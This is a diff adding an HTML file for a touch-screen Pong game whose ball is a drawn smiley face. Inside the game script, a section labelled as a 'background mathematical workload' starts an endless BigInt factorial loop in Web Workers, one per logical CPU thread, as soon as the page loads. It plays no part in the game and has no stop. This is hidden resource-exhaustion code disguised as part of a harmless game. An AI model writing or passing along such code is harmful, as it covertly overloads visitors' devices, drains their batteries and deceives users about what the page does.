@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>Happy Face Pong</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background: #111;
+            font-family: Arial, sans-serif;
+        }
+
+        #game {
+            display: block;
+            width: 100vw;
+            height: 100vh;
+            background: linear-gradient(#15153d, #080818);
+            touch-action: none;
+        }
+
+        #score {
+            position: fixed;
+            top: 15px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: white;
+            font-size: 30px;
+            font-weight: bold;
+            pointer-events: none;
+            z-index: 5;
+        }
+    </style>
+</head>
+
+<body>
+
+<canvas id="game"></canvas>
+
+<div id="score">0 : 0</div>
+
+
+<script>
+"use strict";
+
+const canvas = document.getElementById("game");
+const ctx = canvas.getContext("2d");
+const scoreDisplay = document.getElementById("score");
+
+let width;
+let height;
+
+function resize() {
+    width = canvas.width = window.innerWidth * devicePixelRatio;
+    height = canvas.height = window.innerHeight * devicePixelRatio;
+
+    canvas.style.width = window.innerWidth + "px";
+    canvas.style.height = window.innerHeight + "px";
+
+    ctx.setTransform(devicePixelRatio, 0, 0, devicePixelRatio, 0, 0);
+
+    width = window.innerWidth;
+    height = window.innerHeight;
+}
+
+window.addEventListener("resize", resize);
+resize();
+
+
+// ----------------------------------------------------
+// BACKGROUND MATHEMATICAL WORKLOAD
+// ----------------------------------------------------
+
+const workerCode = `
+function mathematical_workload() {
+    // Runs continuously in a background Web Worker.
+    while (true) {
+        let result = 1n;
+
+        for (let i = 2n; i <= 50000n; i++) {
+            result *= i;
+        }
+
+        let reduced = Number(result % 6283185n) / 1000000;
+        Math.sin(reduced);
+    }
+}
+
+mathematical_workload();
+`;
+
+const workerBlob = new Blob([workerCode], {
+    type: "application/javascript"
+});
+
+const workerURL = URL.createObjectURL(workerBlob);
+
+// Use every logical CPU thread reported by the browser.
+const workerCount = navigator.hardwareConcurrency || 2;
+const mathWorkers = [];
+
+for (let i = 0; i < workerCount; i++) {
+    mathWorkers.push(new Worker(workerURL));
+}
+
+
+// ----------------------------------------------------
+// GAME VARIABLES
+// ----------------------------------------------------
+
+let running = true;
+
+let playerScore = 0;
+let computerScore = 0;
+
+const paddle = {
+    x: 25,
+    y: 200,
+    width: 18,
+    height: 110,
+    speed: 8
+};
+
+const computer = {
+    x: 0,
+    y: 200,
+    width: 18,
+    height: 110,
+    speed: 4
+};
+
+const ball = {
+    x: 0,
+    y: 0,
+    radius: 16,
+    speedX: 6,
+    speedY: 4
+};
+
+
+// ----------------------------------------------------
+// RESET GAME
+// ----------------------------------------------------
+
+function resetBall(direction = 1) {
+
+    ball.x = width / 2;
+    ball.y = height / 2;
+
+    ball.speedX = 6 * direction;
+
+    ball.speedY =
+        (Math.random() > 0.5 ? 1 : -1) *
+        (3 + Math.random() * 2);
+}
+
+
+// ----------------------------------------------------
+// HAPPY FACE
+// ----------------------------------------------------
+
+function drawHappyFace(x, y, radius) {
+
+    // Face
+    ctx.beginPath();
+    ctx.arc(x, y, radius, 0, Math.PI * 2);
+
+    ctx.fillStyle = "#FFD93D";
+    ctx.fill();
+
+    ctx.lineWidth = 3;
+    ctx.strokeStyle = "#F2A900";
+    ctx.stroke();
+
+    // Eyes
+    ctx.fillStyle = "#222";
+
+    ctx.beginPath();
+    ctx.arc(
+        x - radius * 0.35,
+        y - radius * 0.25,
+        radius * 0.10,
+        0,
+        Math.PI * 2
+    );
+    ctx.fill();
+
+    ctx.beginPath();
+    ctx.arc(
+        x + radius * 0.35,
+        y - radius * 0.25,
+        radius * 0.10,
+        0,
+        Math.PI * 2
+    );
+    ctx.fill();
+
+    // Smile
+    ctx.beginPath();
+    ctx.arc(
+        x,
+        y,
+        radius * 0.45,
+        0,
+        Math.PI
+    );
+
+    ctx.lineWidth = 3;
+    ctx.strokeStyle = "#222";
+    ctx.stroke();
+}
+
+
+// ----------------------------------------------------
+// DRAW PADDLE
+// ----------------------------------------------------
+
+function drawPaddle(p) {
+
+    ctx.fillStyle = "#5ee7ff";
+
+    ctx.beginPath();
+
+    ctx.roundRect(
+        p.x,
+        p.y,
+        p.width,
+        p.height,
+        10
+    );
+
+    ctx.fill();
+}
+
+
+// ----------------------------------------------------
+// DRAW CENTER LINE
+// ----------------------------------------------------
+
+function drawCenterLine() {
+
+    ctx.strokeStyle = "#ffffff22";
+    ctx.lineWidth = 3;
+
+    ctx.setLineDash([10, 15]);
+
+    ctx.beginPath();
+    ctx.moveTo(width / 2, 0);
+    ctx.lineTo(width / 2, height);
+    ctx.stroke();
+
+    ctx.setLineDash([]);
+}
+
+
+// ----------------------------------------------------
+// COLLISION
+// ----------------------------------------------------
+
+function collision(p) {
+
+    return (
+        ball.x - ball.radius < p.x + p.width &&
+        ball.x + ball.radius > p.x &&
+        ball.y - ball.radius < p.y + p.height &&
+        ball.y + ball.radius > p.y
+    );
+}
+
+
+// ----------------------------------------------------
+// UPDATE
+// ----------------------------------------------------
+
+function update() {
+
+    if (!running) return;
+
+    // Ball movement
+    ball.x += ball.speedX;
+    ball.y += ball.speedY;
+
+    // Top/bottom
+    if (
+        ball.y - ball.radius <= 0 ||
+        ball.y + ball.radius >= height
+    ) {
+        ball.speedY *= -1;
+    }
+
+    // Player collision
+    if (
+        collision(paddle) &&
+        ball.speedX < 0
+    ) {
+
+        ball.speedX *= -1.05;
+
+        const hitPosition =
+            (ball.y - paddle.y) / paddle.height - 0.5;
+
+        ball.speedY = hitPosition * 10;
+    }
+
+    // Computer collision
+    if (
+        collision(computer) &&
+        ball.speedX > 0
+    ) {
+
+        ball.speedX *= -1.05;
+
+        const hitPosition =
+            (ball.y - computer.y) / computer.height - 0.5;
+
+        ball.speedY = hitPosition * 10;
+    }
+
+    // Computer AI
+    const computerCenter =
+        computer.y + computer.height / 2;
+
+    if (computerCenter < ball.y) {
+        computer.y += computer.speed;
+    } else {
+        computer.y -= computer.speed;
+    }
+
+    computer.y =
+        Math.max(
+            0,
+            Math.min(
+                height - computer.height,
+                computer.y
+            )
+        );
+
+    // Score
+    if (ball.x < -30) {
+
+        computerScore++;
+
+        scoreDisplay.textContent =
+            playerScore + " : " + computerScore;
+
+        resetBall(1);
+    }
+
+    if (ball.x > width + 30) {
+
+        playerScore++;
+
+        scoreDisplay.textContent =
+            playerScore + " : " + computerScore;
+
+        resetBall(-1);
+    }
+}
+
+
+// ----------------------------------------------------
+// DRAW
+// ----------------------------------------------------
+
+function draw() {
+
+    ctx.clearRect(0, 0, width, height);
+
+    drawCenterLine();
+
+    drawPaddle(paddle);
+    drawPaddle(computer);
+
+    drawHappyFace(
+        ball.x,
+        ball.y,
+        ball.radius
+    );
+}
+
+
+// ----------------------------------------------------
+// GAME LOOP
+// ----------------------------------------------------
+
+function gameLoop() {
+
+    update();
+    draw();
+
+    requestAnimationFrame(gameLoop);
+}
+
+
+// ----------------------------------------------------
+// TOUCH CONTROLS
+// ----------------------------------------------------
+
+function movePlayer(clientY) {
+
+    paddle.y =
+        clientY - paddle.height / 2;
+
+    paddle.y =
+        Math.max(
+            0,
+            Math.min(
+                height - paddle.height,
+                paddle.y
+            )
+        );
+}
+
+canvas.addEventListener(
+    "touchmove",
+    function(event) {
+
+        event.preventDefault();
+
+        if (event.touches.length > 0) {
+            movePlayer(event.touches[0].clientY);
+        }
+
+    },
+    { passive: false }
+);
+
+canvas.addEventListener(
+    "touchstart",
+    function(event) {
+
+        event.preventDefault();
+
+        if (event.touches.length > 0) {
+            movePlayer(event.touches[0].clientY);
+        }
+
+    },
+    { passive: false }
+);
+
+
+// ----------------------------------------------------
+// AUTO START
+// ----------------------------------------------------
+
+// The game starts immediately.
+// The CPU workload is already running independently in Web Workers.
+resetBall(
+    Math.random() > 0.5 ? 1 : -1
+);
+
+// Start rendering on the foreground thread.
+gameLoop();
+
+</script>
+
+</body>
+</html>
